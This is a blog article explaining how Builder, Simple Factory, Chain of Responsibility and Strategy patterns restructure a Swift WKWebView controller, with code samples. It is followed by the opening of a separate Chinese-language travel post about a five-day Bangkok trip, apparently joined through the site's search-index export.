Patterns in WKWebViewThis practical application of Design Patterns focuses on consolidating the functional characteristics of WKWebView objects in the current codebase and developing a unified WKWebView component, sharing insights on applying Design Patterns at several appropriate logical abstraction points. The complete demo project code will be attached at the end of the article.Original Non-Abstract Implementationclass WKWebViewController: UIViewController { // MARK - Define some variables and switches for external initialization... // Simulated business logic: switch to open native pages for special paths let noNeedNativePresent: Bool // Simulated business logic: switch for DeeplinkManager checks let deeplinkCheck: Bool // Simulated business logic: is this the home page? let isHomePage: Bool // Simulated business logic: scripts to inject into WKWebView's WKUserScript let userScripts: [WKUserScript] // Simulated business logic: scripts for WKWebView's WKScriptMessageHandler let scriptMessageHandlers: [String: WKScriptMessageHandler] // Whether to allow overriding the ViewController title from the WebView let overrideTitleFromWebView: Bool let url: URL // ... }// ...extension OldWKWebViewController: WKNavigationDelegate { // MARK - iOS WKWebView's navigationAction Delegate, used to decide how to handle the link to be loaded // Always call decisionHandler(.allow) or decisionHandler(.cancel) at the end // decisionHandler(.cancel) will interrupt the loading of the page // Here, different variables and switches simulate different logical processes: func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // Simulated business logic: WebViewController deeplinkCheck == true (indicating a need to check via DeepLinkManager and open the page) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // Simulated DeepLinkManager logic; if the URL can be opened successfully, open it and end the process. // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // Simulated business logic: WebViewController isHomePage == true (indicating it is the home page) &amp; WebView is browsing the home page, switch TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // Simulated business logic: WebViewController noNeedNativePresent == false (indicating a need to match special paths to open native pages) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } decisionHandler(.allow) }}// ...Issues The variables and switches are scattered throughout the class, making it unclear which are for configuration. WKUserScript variable settings are directly exposed to the outside, whereas we want to control the injected JS and only allow specific behaviors. There is no control over the registration rules for WKScriptMessageHandler. If similar WebViews need to be initialized, the injection parameter rules must be rewritten, and the parameter rules cannot be reused. The navigationAction Delegate relies on variables to control the flow; if the flow or order needs to be modified, the entire code must be altered, which could disrupt previously functioning processes.Builder Pattern The Builder Pattern is a creational design pattern that separates the steps and logic of object creation, allowing the operator to set parameters step by step and reuse settings, ultimately creating the target object. Additionally, the same creation steps can produce different objects.The above diagram uses the example of making a Pizza, breaking down the steps into several methods declared in the PizzaBuilder protocol (interface). ConcretePizzaBuilder is the actual object that makes the Pizza, which could be a VegetarianPizzaBuilder or a MeatPizzaBuilder; different builders may use different ingredients, but they all ultimately build() a Pizza object.WKWebView ScenarioReturning to the WKWebView scenario, our final output object is MyWKWebViewConfiguration. We consolidate all the variables that WKWebView needs into this object and use the Builder Pattern MyWKWebViewConfigurator to gradually complete the configuration construction.public struct MyWKWebViewConfiguration { let headNavigationHandler: NavigationActionHandler? let scriptMessageStrategies: [ScriptMessageStrategy] let userScripts: [WKUserScript] let overrideTitleFromWebView: Bool let url: URL}// All parameters are exposed only within the module (Internal)MyWKWebViewConfigurator (Builder Pattern) In this case, since I only need to build for MyWKWebView, I did not further separate MyWKWebViewConfigurator into protocols (interfaces).public final class MyWKWebViewConfigurator { private var headNavigationHandler: NavigationActionHandler? = nil private var overrideTitleFromWebView: Bool = true private var disableZoom: Bool = false private var scriptMessageStrategies: [ScriptMessageStrategy] = [] public init() { } // Parameter encapsulation and internal control public func set(disableZoom: Bool) -&gt; Self { self.disableZoom = disableZoom return self } public func set(overrideTitleFromWebView: Bool) -&gt; Self { self.overrideTitleFromWebView = overrideTitleFromWebView return self } public func set(headNavigationHandler: NavigationActionHandler) -&gt; Self { self.headNavigationHandler = headNavigationHandler return self } // New logical rules can be encapsulated here public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } public func build(url: URL) -&gt; MyWKWebViewConfiguration { var userScripts:[WKUserScript] = [] // Attach only when generating if disableZoom { let script = \"var meta = document.createElement('meta'); meta.name='viewport'; meta.content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'; document.getElementsByTagName('head')[0].appendChild(meta);\" let disableZoomScript = WKUserScript(source: script, injectionTime: .atDocumentEnd, forMainFrameOnly: true) userScripts.append(disableZoomScript) } return MyWKWebViewConfiguration(headNavigationHandler: headNavigationHandler, scriptMessageStrategies: scriptMessageStrategies, userScripts: userScripts, overrideTitleFromWebView: overrideTitleFromWebView, url: url) }}By adding another layer, we can better utilize access control to isolate parameter usage rights. In this scenario, we want to allow the injection of WKUserScript into MyWKWebView, but we do not want to open it up too broadly for users to inject freely. Therefore, by combining the Builder Pattern with Swift Access Control, when MyWKWebView is placed within the module, MyWKWebViewConfigurator encapsulates the operational methods like func set(disableZoom: Bool), while internally, it adds WKUserScript when generating MyWKWebViewConfiguration. All parameters of MyWKWebViewConfiguration are immutable from the outside and can only be generated through MyWKWebViewConfigurator.MyWKWebViewConfigurator + Simple FactoryOnce we have the MyWKWebViewConfigurator Builder, we can create a simple factory to encapsulate and reuse the creation steps.struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Chain of Responsibility Pattern The Chain of Responsibility Pattern is a behavioral design pattern that encapsulates the operations of object handling and links them in a chain structure. Request operations are passed along the chain until they are handled; the linked operations can be freely and flexibly combined and reordered. The Chain of Responsibility focuses on whether you want to handle something when it comes in; if not, just skip it. Therefore, it cannot handle partially or modify the input object before passing it to the next; if that is the requirement, it is another Interceptor Pattern.The above diagram uses Tech Support (or OnCall) as an example. When a problem object comes in, it first goes through CustomerService. If they cannot handle it, it is passed to the next level, Supervisor. If they still cannot handle it, it continues down to TechSupport. Additionally, different responsibility chains can be formed for different issues; for example, if it is a major client’s issue, it will be handled starting from Supervisor. The Responder Chain in Swift UIKit also uses the Chain of Responsibility Pattern.WKWebView ScenarioIn our WKWebView scenario, this pattern is primarily applied in the func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) delegate method. When the system receives a URL request, it goes through this method to decide whether to allow the jump, and at the end of the processing, it calls decisionHandler(.allow) or decisionHandler(.cancel) to inform the result.In the implementation of WKWebView, there are many conditions to check, and some pages require different handling that needs to be bypassed:// Original implementation...func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // Simulating business logic: WebViewController deeplinkCheck == true (indicating a check with DeepLinkManager is needed to open the page) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // Simulating DeepLinkManager logic; if the URL can be opened successfully, open it and end the process. // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // Simulating business logic: WebViewController isHomePage == true (indicating it's the home page) &amp; WebView is browsing the home page, then switch TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // Simulating business logic: WebViewController noNeedNativePresent == false (indicating a special path needs to open a native page) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } // more... decisionHandler(.allow)}As time goes on, the functionality becomes increasingly complex, and the logic here will grow as well. If the order of handling also needs to differ, it can turn into a disaster.NavigationActionHandler (Chain of Responsibility Pattern)First, define the Handler Protocol:public protocol NavigationActionHandler: AnyObject { var nextHandler: NavigationActionHandler? { get set } /// Handles navigation actions for the web view. Returns true if the action was handled, otherwise false. func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool /// Executes the navigation action policy decision. If the current handler does not handle it, the next handler in the chain will be executed. func execute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void)}public extension NavigationActionHandler { func execute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { if !handle(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) { self.nextHandler?.execute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) } }} The operation will be implemented in func handle(). If there is further processing, return true; otherwise, return false. func execute() is the default chain access implementation, which traverses the entire operation chain. The default behavior is that when func handle() returns false (indicating this node cannot handle it), it automatically calls the next nextHandler’s execute() to continue processing until completion.Implementation:// Default implementation, usually placed at the endpublic final class DefaultNavigationActionHandler: NavigationActionHandler { public var nextHandler: NavigationActionHandler? public init() { } public func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { decisionHandler(.allow) return true }}//final class PaymentNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // Simulating business logic: Payment related, two-factor authentication WebView...etc print(\"Present Payment Verify View Controller\") decisionHandler(.cancel) return true }}//final class DeeplinkManagerNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // Simulating DeepLinkManager logic; if the URL can be opened successfully, open it and end the process. // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return true // } else { return false // }}// More...Usage:extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { let headNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() let paymentNavigationActionHandler = PaymentNavigationActionHandler() headNavigationActionHandler.nextHandler = paymentNavigationActionHandler paymentNavigationActionHandler.nextHandler = defaultNavigationActionHandler headNavigationActionHandler.execute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) }}This way, when a request is received, it will be processed in the order defined by our handling chain.Combining with the previous Builder Pattern, MyWKWebViewConfigurator, we can expose headNavigationActionHandler as a parameter, allowing external determination of the handling requirements and order for this WKWebView:extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { configuration.headNavigationHandler?.execute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) }}//...struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: // Simulating default situation with these handlers let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let homePageTabSwitchNavigationActionHandler = HomePageTabSwitchNavigationActionHandler() let nativeViewControllerNavigationActionHandler = NativeViewControllerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() deplinkManagerNavigationActionHandler.nextHandler = homePageTabSwitchNavigationActionHandler homePageTabSwitchNavigationActionHandler.nextHandler = nativeViewControllerNavigationActionHandler nativeViewControllerNavigationActionHandler.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .add(scriptMessageStrategy: UserScriptMessageStrategy()) .set(headNavigationHandler: deplinkManagerNavigationActionHandler) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: // Simulating payment page needing only these handlers, with paymentNavigationActionHandler having the highest priority let paymentNavigationActionHandler = PaymentNavigationActionHandler() let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() paymentNavigationActionHandler.nextHandler = deplinkManagerNavigationActionHandler deplinkManagerNavigationActionHandler.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Strategy Pattern The Strategy Pattern is a behavioral design pattern that abstracts actual operations, allowing us to implement various operations that can be flexibly replaced based on different contexts.The above diagram uses different payment methods as an example. We abstract payment as a Payment Protocol (Interface), and various payment methods implement their own versions. In PaymentContext (simulating external usage), based on the user’s selected payment method, the corresponding Payment instance is created, and pay() is called to proceed with the payment.WKWebView Scenario Used in the interaction between WebView and front-end pages. When the front-end JavaScript calls: window.webkit.messageHandlers.Name.postMessage(Parameters); It will enter WKWebView, find the corresponding Name’s WKScriptMessageHandler Class, and execute the operation.The system already has defined Protocols and the corresponding func add(_ scriptMessageHandler: any WKScriptMessageHandler, name: String) method. We just need to define our own WKScriptMessageHandler implementation and add it to WKWebView. The system will then use the Strategy Pattern to dispatch to the corresponding concrete strategy based on the received name.Here, we simply extend the Protocol WKScriptMessageHandler to include an additional identifier:String for use in add(.. name:):public protocol ScriptMessageStrategy: NSObject, WKScriptMessageHandler { static var identifier: String { get }}Implementation:final class PageScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"page\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // Simulating called from js: window.webkit.messageHandlers.page.postMessage(\"Close\"); print(\"\\(Self.identifier): \\(message.body)\") }}//final class UserScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"user\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // Simulating called from js: window.webkit.messageHandlers.user.postMessage(\"Hello\"); print(\"\\(Self.identifier): \\(message.body)\") }}Registering in WKWebView:var scriptMessageStrategies: [ScriptMessageStrategy] = []scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier)}Combining with the previous Builder Pattern, MyWKWebViewConfigurator, to manage the registration of ScriptMessageStrategy from the outside:public final class MyWKWebViewConfigurator { //... // Logic for adding can be encapsulated here public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { // Here we implement logic to remove old ones if the identifier is duplicated scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } //...}//...public class MyWKWebViewController: UIViewController { //... public override func viewDidLoad() { super.viewDidLoad() //... configuration.scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier) } //... }}Question: Can this scenario also be replaced with the Chain of Responsibility Pattern?At this point, some may wonder if the Strategy Pattern here can be replaced with the Chain of Responsibility Pattern. Both design patterns are behavioral and can be interchangeable; however, it depends on the specific requirements of the scenario. In this case, it is a typical Strategy Pattern, where WKWebView decides which different Strategy to enter based on the Name. If our requirement is that different Strategies may have a chain dependency or recovery relationship, for example, if AStrategy does not handle it, it should be passed to BStrategy, then we would consider using the Chain of Responsibility Pattern. Strategy Pattern: There is a clear dispatch to execute strategies, and there is no relationship between strategies. Chain of Responsibility Pattern: The execution strategy is determined within individual implementations; if it cannot be handled, it is passed down to the next implementation.In complex scenarios, you can use the Strategy Pattern combined with the Chain of Responsibility Pattern to achieve the desired outcome.Final Combination Simple Factory Pattern MyWKWebViewConfiguratorFactory -&gt; Encapsulates the steps to create MyWKWebViewConfigurator Builder Pattern MyWKWebViewConfigurator -&gt; Encapsulates the parameters and construction steps for MyWKWebViewConfiguration MyWKWebViewConfiguration is injected -&gt; For use in MyWKWebViewController Chain of Responsibility Pattern in MyWKWebViewController’s func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Calls headNavigationHandler?.execute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) to chain execute processing Strategy Pattern in MyWKWebViewController’s webView.configuration.userContentController.addUserScript(XXX) dispatches the corresponding JS Caller to the appropriate handling strategyComplete Demo RepoFurther Reading Practical Applications of Design Patterns Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableViewIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 487 Total Views Last Statistics Date: 2025-08-15 | 429 Views on Medium." }, { "title": "遊記 2024 泰國曼谷 Bangkok 🇹🇭 5 日自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2024-%E6%B3%B0%E5%9C%8B%E6%9B%BC%E8%B0%B7-bangkok-5-%E6%97%A5%E8%87%AA%E7%94%B1%E8%A1%8C-b7e7c0938985/", "categories": "Z 度旅行遊記", "tags": "生活, travel, travel-writing, bangkok, thailand", "date": "2024-08-25 01:23:20 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2024 泰國曼谷 Bangkok 🇹🇭 5 日自由行疫情後再訪泰國，曼谷五日快閃自由行。曼谷的回憶時間回到 2018 年，出社會的第一份工作第一間公司的員工旅遊、也是我第一次出國，就是去泰國曼谷+華新(5 日)；隔...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2024 泰國曼谷 Bangkok 🇹🇭 5 日自由行疫情後再訪泰國，曼谷五日快閃自由行。曼谷的回憶時間回到 2018 年，出社會的第一份工作第一間公司的員工旅遊、也是我第一次出國，就是去泰國曼谷+華新(5 日)；隔年 2019 同樣跟著公司員旅去沙巴；再來就是被疫情偷走的兩年，疫情結束後就開始瘋日本自由行了。那時候小菜雞一枚、社會經驗 0，矇矇懂懂的跟著哥哥姊姊一起出去，連飛機什麼能帶什麼不能帶都不知道，過安檢的時候還天兵的把護照放籃子上面，出機器的時候發現掉在傳送帶，差點嚇死(如果剛好掉到縫隙就不用回來了)；那次是無腦跟團、無腦坐遊覽車，對曼谷的印象沒有很清晰，只記得高空酒吧很讚、天氣熱、東西便宜、按摩便宜，就沒了，對地理位置也完全沒有概念。因此一直想著有機會要回曼谷舊地重遊，補充六年前的回憶；但是對東南亞不熟悉，不太敢獨旅， 正好年初在跟 Pinkoi 同事嘴砲，就揪成了此次曼谷五日自由行之遊。 2018 年的曼谷+華新五日遊，行程細節與回憶碎片，我放在文末附錄。準備!👉👉👉KKday 方案推薦： 昭披耶公主號郵輪自助晚餐｜Chao Phraya Princess River Cruise 曼谷經典一日遊｜美功鐵路和丹嫩莎朵水上市場 | 曼谷出發 【泰國】曼谷包車半日遊｜美功鐵道市場 — 安帕瓦水上市場 — 安帕瓦螢火蟲遊河 曼谷王權 Mahanakhon SkyWalk 觀景台門票 泰國機場 BKK 出境 meet and greet 快速尊榮接待服務 泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK)— — —因為 6 月就已經開始新工作了，沒什麼心思在玩樂上，主要是 Mark 和 Sean 負責安排和規劃，我沒有做太多功課。 ⚠️⚠️⚠️泰國曼谷旅遊安全及注意事項我放在遊記後，可以不看遊記但一定要了解放詐騙跟注意事項還有想碰大麻煩該注意的事。時程安排 2024/08/02 ~ 2024/08/06 Day 1 08/02 : 預計 18:45 抵達曼谷機場 ，到飯店大約 20:00 後，飯店休息或去飯店酒吧 Day 2 08/03 : 昭披耶河一代景點，大皇宮、臥佛寺、玉佛寺、鄭王廟、ICONSIAM、晚上去找 前數字科技(現 Agoda)一哥 Chun-Hsiu Liu Lhao Lhao 吃飯、聽 Rock Pub Live 。 Day 3 08/04 : 恰圖恰市集、王權瑪哈納功大廈、喬德夜市 ( 火山排骨 ) Day 4 08/05 : 逛街購物，Central World、Terminal 21 Day 5 08/06 : 回程， 15:20 的飛機網路這次準備倉促，前一天都還沒準備好網路，也來不及買習慣的實體 SIM 卡，所幸首次嘗試 eSIM。(用完就愛上了)直接上 KKday 買 泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM ，買完直接收到 eSIM 啟用憑證，就能使用了。泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM 限時促銷優惠：即日起至2024年12月31日，活動期間內激活啟用可享高速流量15GB翻倍至30GB，超過30GB後降速至 384 Kbps，不斷網。 AIS 網內無限通話、50泰銖通話額度，使用以下軟體傳文字訊息時，可使用額外流量共10GB(10Mbps)：Tiktok、Wechat及Instagram 有實體號碼、可通話、收簡訊！ 天數計算方式：24小時制，eSIM激活後起算，24小時為一日（泰國時間）。主要是吃到飽、比實體 SIM 卡還便宜，8 日 NT $232。機票 🛫 去程：TPE 16:00 -&gt; BKK 18:45 回程：BKK 15:20 -&gt; TPE 20:10航空公司：Thai VietJet Air 越捷航空 (廉航)價格： TWD $9,259 (包含加購的來回 15 kg 行李托運)當初想說跟大家一起行動，我朋友沒有托運(票價大約在 $6,000 左右)，後來查了一下其他航空公司，感覺虧大了；一般航空公司差不多的時段大約 $10,000 上下，差距不大，但是舒服很多啊！Thai VietJet Air 越捷航空的行李規定其實可以不托運，他可以攜帶兩件手提行李，總重不超過 7 公斤即可。1.手提行李重量：每個乘客（除了嬰兒外）可以帶1件自己的行李和1件小手提行李，最大總重量不得超過07 kg。2.手提行李尺寸：- 01 件具有最大的尺寸為56cm x 36cm x 23cm 的手提行李- 01件小手提行李 (包括如下袋子) + 01個女孩用的袋子，雜誌，照相機，裝嬰兒用的食品袋，具有不得超過30cm x 20cm x 10cm 尺寸的在機場購買的袋子等等。 + 01個裝 外套當打開時不得超過 114cm x 60cm x 11cm尺寸。 + 01個裝筆記本具有尺寸最大為 40cm x 30cm x 10cm 截自 2024/08/22 的資訊，一切以官方最新公告為主。基本上背一個包包＋拖一個登機箱就可以了。8/1 航變通知8/1 晚上 11 點多收到航變通知信，時程改成 16:35 出發，19:20 抵達。住JC KEVIN SATHORN BANGKOK HOTEL 曼谷JC 凯文沙吞酒店 五星級公寓型飯店36 Narathiwas-Ratchanakarin Road, Yannawa, Sathorn, Bangkok, 沙吞, 曼谷, 曼谷, 泰國, 10120 房型： 天際線雙臥室套房 — 有陽台 Skyline 2-Bedroom Suite with Balcony ，後面有開箱影片。 交通：從地圖看距離最近 BTS Chong Nonsi 站 1 公里約 15 分鐘。 價格：NT 31,315 / 4 人 / 4晚。(因為太晚訂，所以很貴，早點可以打到 4–5 折)貨幣同行友人有先換 3,000 THB，我是到當地才去 SuperRich 換。交通在台灣就先註冊好 Grab 、綁定好信用卡，方便直接使用。台灣伴手禮幫 Agoda 一哥準備的台灣味伴手禮。 黑松沙士、麥香奶茶、維他露 P、義美泡芙、蝦味先、維力炸醬面、鳳梨酥、波的多蚵仔煎洋芋片、可樂果、綠色乖乖香港人既Party Room / BBQ場平台 — Common Room預約平台在遊記開始前，先介紹一個最近 香港 新推出的 日租/時租酒店 、 Party Room 包廂、 遊艇趴 . .預約平台 — Common Room 。Common Room無論你是想找個Party Room慶祝、還是要日租酒店/賓館短住，你都可以使用 Common Room平台，輕鬆去尋找你的心儀場地！現在更可以預約香港的船P呀。有要去香港旅遊的朋友，想嘗試不同場地的體驗，可以立即前往看看： Common Room 預約平台 。8/02 Day 1 出發約 12:30 下午下班後從家裡出發 記得務必搭機捷直達車，普通車就算早上車但不會比直達車早到！約 13:30 抵達桃園機場第一航廈報到ˊ櫃檯完全沒人，到了就直接報到+完成托運手續了。又又又是 B1R，最角落＋需要搭接駁車的登機門。離下午四點還很早，又又又來吃一航頂呱呱，這次發現可以單點呱呱包了，以前只賣炸雞！這次才發現原來頂呱呱這邊再往前走直通第二航廈，所以如果很有時間其實可以走去第二航廈吃東西；或是第二航廈跑來第一航廈免費貴賓室休息ＸＤ買完頂呱呱一樣到第一航廈免費貴賓室坐著休息、吃東西，這次看到有人在充電， 上次來看插座都被挖空了，看來是修好了 （？）約 15:30 前往 B1R 候機室不知道是不是廉航的原因，資訊沒更新(一直顯示 16:00，實際已變更到 16:35)。加上班機又延誤，實際起飛時間：17:13。 越捷位子跟虎航差不多大，都比樂桃大，但椅子不好坐、皮沙發材質不透氣、坐太久屁股會痛。 越捷應該是可以吃自己的東西的，回程有人買芒果糯米飯在上面吃也沒怎樣。19:30 抵達曼谷 BKK 素萬那普機場聽同事說才知道曼谷機場如果高峰時間來，可以購買 泰國機場 BKK 出境 meet and greet 快速尊榮接待服務 走快速通關ＸＤ，但我們這時間抵達，幾乎只有同班機的人，所以通關很快。20:00 領完行李、出機場可能因為廉航的關係，沒什麼人托運，行李提領超快。eSIM 網路設定一出機場開始摸索如何設定、啟用 eSIM，才知道… ⚠️eSIM 啟用會需要連接網路⚠️ ⚠️eSIM 啟用會需要連接網路⚠️ ⚠️eSIM 啟用會需要連接網路⚠️有點像買了一把剪刀但是需要另一支剪刀剪開一樣，eSIM 啟用會需要先連接網路從網路啟用；還好同行的朋友在台灣就先啟用 eSIM 了就借他的網路啟用我的 eSIM。(機場也有 Wi-Fi 可用，所以不用太擔心)找到 eSIM 開通信，直接長按 QRCode 選擇 加入 eSIM 即可。 不知道為何，如果把 QRCode 存到相片或備忘錄就沒有此快速加入的功能了，另外的方法是先把 QRCode 傳給同行者或是印出來給手機掃描。iPhone iOS eSIM 手動設定路徑：設定 -&gt; 行動網路 -&gt; 加入 eSIM -&gt; 掃描 QRCode -&gt; 手動輸入資訊 -&gt; 輸入信中資訊 -&gt; 用作. .可以選「旅遊」-&gt; 行動數據選擇使用「旅遊」-&gt; 完成！啟用完成後，等於雙卡雙待，只是說原本的門號 SIM 卡沒買漫遊方案前沒有網路， 緊急情況還可以切回原本的 SIM 卡門號！ AIS 查詢手機號碼請撥打 *545# ，查詢話費餘額請撥打 *121# ，流量查詢請撥打 *121*3#20:30 機場覓食因為到市區、飯店還要一個多小時，廉航沒有供餐，大家都飢腸轆轆，就先在機場覓食吃晚餐了。找了一家泰式餐廳吃一吃，打拋豬好辣好爽、配蔬菜湯可以緩解它的辣。21:00 移動前往飯店 👉👉👉可以參考 KKday 機場接送服務： - 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 - 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK)吃完大約 21:00，開始往市區、飯店移動。搭乘公共運輸需要轉三趟地鐵、BTS： 機場快線 Suvarnabhumi -&gt; Phaya Thai BTS Sukhumvit Line Phaya Thai -&gt; Siam BTS Silom Line Siam -&gt; Chong Nonsi 機場快線只能買票 BTS 可以到人工窗口買兔子卡 (BTS 交通卡) 儲值、刷卡進出站 請注意 兔子卡只能用在 BTS ，不能用在 MRT、機場快線 抵達 Chong Nonsi (後來才知道 王權瑪哈納功大廈 就是這一站啊！)步行前往 JC KEVIN SATHORN BANGKOK HOTEL 曼谷JC 凯文沙吞酒店出 BTS 不要急著下天橋，可以一路從天橋走過馬路。 一路上我覺得很黑暗(沒什麼路燈)，走起來也蠻遠的 (15 mins / 1 KM)，如果一個人晚上走起來挺可怕的 ，途中會經過一家 7–11 跟一個小夜市，在 7–11 買了點吃的帶回飯店。 另外如果搭乘計程車，因雙向道跟迴轉問題，司機要開過飯店一小段到下一個缺口才能迴轉回飯店，所以也稍微麻煩。10:30 JC KEVIN SATHORN BANGKOK HOTEL 曼谷JC 凯文沙吞酒店大約 10:30 抵達飯店。房間非常大，是一整間公寓式的房間，一間主臥、一間次臥、雙衛浴、廚房、客廳、陽台。2018 回憶拍攝於 2018 / iPhone 6想不到這麼巧，2018 年那次跟團員工旅遊來曼谷，大家晚上特別坐計程車來的高空酒吧就是這家飯店的酒吧ＸＤ另外他也有提供 Sky Bar 晚餐組合： 曼谷薩通JC凱文酒店 Zoom Sky Bar 晚餐20242024 / iPhone 15 Pro這次既然都住這裡了，房間放完行李之後也跑上去看看。因早已超過晚餐時間，所以只能點一些下酒菜、串燒食物。8/03 Day 2 